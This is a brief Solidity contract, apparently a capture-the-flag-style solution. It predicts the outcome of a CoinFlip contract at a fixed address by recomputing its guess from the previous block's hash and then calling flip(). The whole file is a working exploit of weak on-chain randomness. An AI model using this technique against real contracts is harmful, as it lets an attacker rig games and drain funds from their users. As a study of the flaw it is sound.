// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract GuessCoinFlip {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address coinFlipAddr = 0x357b9076172c3F189dB71B381fa7E65627e2B230;

    function guess() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        ICoinFlip(coinFlipAddr).flip(side);
    }
}
